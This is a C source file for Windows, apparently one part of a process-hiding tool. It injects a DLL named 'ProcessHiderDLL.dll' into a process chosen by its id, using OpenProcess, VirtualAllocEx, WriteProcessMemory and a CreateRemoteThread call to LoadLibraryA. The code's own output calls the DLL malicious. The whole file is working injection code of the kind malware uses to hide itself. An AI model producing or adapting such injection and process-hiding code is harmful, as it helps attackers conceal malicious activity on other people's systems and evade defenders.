#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <malloc.h>
#include <memoryapi.h>
#include <processthreadsapi.h>

int main() {

	printf("Enter a pid to inject \"ProcessHiderDLL.dll\" into: ");
	int pid;
	scanf_s("%d", &pid);

	HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	int dllNameLen = strlen("..\\..\\ProcessHiderDLL\\Debug\\ProcessHiderDLL.dll") + 1;
	if (handle != NULL) {
		printf("[*] The process has been opened successfully!\r\n");
		LPVOID dllNamePointer = VirtualAllocEx(handle, NULL, dllNameLen, 0x3000, PAGE_READWRITE); //allocate a buffer in the process for the name of process hider dll 
		if (dllNamePointer != NULL) {
			printf("[*] The memory has been allocated in the process successfully!\r\n");
			if (WriteProcessMemory(handle, dllNamePointer, "..\\..\\ProcessHiderDLL\\Debug\\ProcessHiderDLL.dll", dllNameLen, NULL) != 0) { //write the name of process hider dll in the allocated memory
				printf("[*] The malicious dll name has been written in the process successfully!\r\n");
				if (CreateRemoteThread(handle, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, dllNamePointer, 0, NULL) != NULL) { //create remote thread in the process which loads the process hider dll
					printf("[*] The remote thread has been created successfully!\r\n");
				}
			}
		}
	}
}
